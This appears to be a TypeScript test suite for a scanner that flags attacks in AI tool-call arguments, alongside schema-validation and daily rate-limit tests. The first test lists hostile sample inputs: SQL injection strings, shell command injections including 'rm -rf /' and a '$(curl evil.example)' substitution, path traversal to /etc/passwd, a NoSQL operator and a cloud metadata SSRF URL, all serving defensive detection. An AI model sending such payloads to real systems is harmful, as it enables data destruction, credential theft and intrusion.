import { findArgumentAttacks } from '../mcp/argument-attacks';
import { validateArguments } from '../mcp/schema';
import { RateCounter } from '../services/rate-counter';
import { MemoryStore, setRecords } from '@ai-governance/storage';

const kinds = (v: unknown) => [...new Set(findArgumentAttacks(v).map((f) => f.kind))].sort();

describe('attacks in tool arguments', () => {
  it('finds SQL injection, commands, path traversal, NoSQL operators and metadata requests', () => {
    for (const s of ["1' OR '1'='1", "x' or 1=1 --", "admin'--", '1 UNION SELECT password FROM users', "1; DROP TABLE users", "1' AND SLEEP(5)", "'; EXEC xp_cmdshell 'dir'"]) {
      expect([s, kinds({ q: s })]).toEqual([s, ['sql']]);
    }
    expect(kinds({ host: 'example.com; rm -rf /' })).toEqual(['command']);
    expect(kinds({ name: 'a $(curl evil.example)' })).toContain('command');
    expect(kinds({ name: 'x | bash' })).toEqual(['command']);
    expect(kinds({ file: '../../etc/passwd' })).toEqual(['path']);
    expect(kinds({ file: '..%2F..%2Fsecrets' })).toEqual(['path']);
    expect(kinds({ user: { $ne: null } })).toEqual(['nosql']);
    expect(kinds({ url: 'http://169.254.169.254/latest/meta-data/' })).toEqual(['ssrf']);
    expect(findArgumentAttacks({ body: { items: ["' OR 1=1"] } })[0].path).toBe('arguments.body.items[0]');
  });

  it('lets ordinary text through', () => {
    for (const s of ["O'Brien", "rock & roll", "It's 5 o'clock", 'Select the best option', 'Price: $(5) off', 'see ./docs/readme.md', 'https://example.com/a/b', 'a-b_c 100%', 'Q3 - update', 'don\'t drop the ball']) {
      expect([s, findArgumentAttacks({ q: s })]).toEqual([s, []]);
    }
    expect(findArgumentAttacks({ count: 3, ok: true, tags: ['a', 'b'] })).toEqual([]);
  });
});

describe('argument schema: pattern and format', () => {
  const schema = { type: 'object', properties: {
    id: { type: 'string', pattern: '^E[0-9]{4}$' }, email: { type: 'string', format: 'email' }, when: { type: 'string', format: 'date' },
    n: { type: 'integer', format: 'int32' }, weird: { type: 'string', pattern: '(' }, any: { type: 'string', format: 'made-up' },
  } } as any;
  it('enforces the API’s pattern and the common formats', () => {
    expect(validateArguments(schema, { id: 'E1234', email: 'a@b.co', when: '2026-11-13', n: 5 })).toEqual([]);
    expect(validateArguments(schema, { id: "E1234' OR 1=1" })).toEqual(["arguments.id isn't in the expected form"]);
    expect(validateArguments(schema, { email: 'nope' })).toEqual(['arguments.email should be an email address']);
    expect(validateArguments(schema, { when: '13/11/2026' })).toEqual(['arguments.when should be a date']);
    expect(validateArguments(schema, { n: 2 ** 40 })).toEqual(['arguments.n is out of range for int32']);
  });
  it('skips broken patterns and unknown formats rather than refusing everything', () => {
    expect(validateArguments(schema, { weird: 'x', any: 'y' })).toEqual([]);
  });
});

describe('daily counters', () => {
  it('count per UTC day and say when they reset', async () => {
    setRecords(new MemoryStore());
    const c = new RateCounter();
    const t = Date.parse('2026-11-13T23:59:00Z');
    expect((await c.hit('t1', 's', 2, t, 'day')).allowed).toBe(true);
    expect((await c.hit('t1', 's', 2, t, 'day')).allowed).toBe(true);
    const third = await c.hit('t1', 's', 2, t, 'day');
    expect(third).toMatchObject({ allowed: false, retryAfter: 60 });
    expect((await c.hit('t1', 's', 2, t + 120_000, 'day')).allowed).toBe(true);
  });
});
